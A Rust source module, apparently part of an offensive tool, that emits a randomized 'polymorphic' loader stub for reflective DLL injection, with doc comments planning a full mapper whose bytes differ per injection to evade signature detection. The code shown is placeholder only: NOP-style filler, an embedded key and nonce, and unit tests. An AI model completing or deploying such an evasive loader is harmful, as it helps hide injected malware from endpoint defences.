//! Sub-issue #735 — polymorphic loader stub generator.
//!
//! Emits the base reflective-loader bytes for one injection. Each call must
//! produce a *different* byte sequence that performs the same logical
//! operation: locate kernel32, resolve `LoadLibrary`/`GetProcAddress`, map
//! the encrypted payload, and jump to its entry point.
//!
//! ## Today (foundation)
//! Returns a randomized prologue + fixed body placeholder. The randomized
//! prologue alone is enough to fuzz signature hashes and prove the pipeline.
//!
//! ## Planned (#735)
//! - Template-based assembler: tokenized opcodes selected by RNG
//! - Multiple equivalent implementations for each functional block
//! - Inline the per-injection key/nonce as immediate operands
//! - Full x86_64 reflective mapper emission

use super::PolymorphicError;
use rand::RngCore;

/// Emit a fresh base loader stub. Bytes will differ between calls.
///
/// The current implementation produces a randomized prologue followed by
/// placeholder body bytes that encode the key + nonce. Sub-issue #735 will
/// replace the body with a real reflective mapper assembled from a pool of
/// equivalent instruction templates.
pub fn emit_base_stub(key: &[u8; 32], nonce: &[u8; 12]) -> Result<Vec<u8>, PolymorphicError> {
    let mut stub = Vec::with_capacity(256);

    // Random NOP-equivalent prologue. Length itself is randomized so that
    // body offsets shift between injections.
    let prologue_len = 8 + (rand_byte() as usize % 24);
    for _ in 0..prologue_len {
        stub.push(pick_nop_variant());
    }

    // Placeholder body — a real mapper goes here. We embed the key + nonce
    // so downstream stages see realistic-looking immediates.
    stub.extend_from_slice(key);
    stub.extend_from_slice(nonce);

    // Random epilogue padding.
    let pad = rand_byte() as usize % 16;
    for _ in 0..pad {
        stub.push(pick_nop_variant());
    }

    Ok(stub)
}

fn rand_byte() -> u8 {
    let mut b = [0u8; 1];
    rand::rng().fill_bytes(&mut b);
    b[0]
}

/// Pick a single-byte NOP-equivalent. Sub-issue #735 will extend this to
/// multi-byte NOP encodings (`66 90`, `0F 1F 00`, etc.) and operand-size
/// prefixed variants.
fn pick_nop_variant() -> u8 {
    // x86 single-byte NOPs / harmless filler:
    //   0x90 — NOP
    //   0x66 — operand-size prefix (used in 66 90 multi-byte NOP)
    const VARIANTS: &[u8] = &[0x90, 0x66];
    VARIANTS[(rand_byte() as usize) % VARIANTS.len()]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn emit_produces_distinct_stubs() {
        let key = [0xAAu8; 32];
        let nonce = [0xBBu8; 12];
        let a = emit_base_stub(&key, &nonce).unwrap();
        let b = emit_base_stub(&key, &nonce).unwrap();
        // With randomized prologue length, byte-equality across calls
        // would mean the RNG broke.
        assert_ne!(a, b, "stub bytes must differ between calls");
    }

    #[test]
    fn emit_embeds_key_and_nonce() {
        let key = [0x11u8; 32];
        let nonce = [0x22u8; 12];
        let stub = emit_base_stub(&key, &nonce).unwrap();
        // Key + nonce must appear in the stub for the decryptor to use.
        assert!(stub.windows(32).any(|w| w == key));
        assert!(stub.windows(12).any(|w| w == nonce));
    }
}
